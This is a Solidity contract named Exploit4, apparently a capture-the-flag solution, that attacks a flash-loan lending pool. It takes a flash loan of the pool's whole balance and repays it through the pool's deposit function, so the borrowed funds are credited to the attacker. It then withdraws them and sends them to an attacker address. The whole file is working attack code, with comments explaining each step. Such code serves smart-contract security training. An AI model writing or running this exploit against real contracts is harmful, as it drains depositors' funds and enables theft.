// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface Lender {
    function flashLoan(uint256 amount) external;
    function withdraw() external;
    function deposit() external payable;
}

contract Exploit4 {
    Lender lender;

    function attack(address lender_, address attacker) public {
        lender = Lender(lender_);
        
        // flashloan entire pool and payback by depositing into our balance
        lender.flashLoan(address(lender).balance);

        // move funds to this contract
        lender.withdraw();

        // move to attacker EOA
        payable(attacker).transfer(address(this).balance);
    }

    function execute() external payable {
        // paying back flashloan, but into our balance
        lender.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}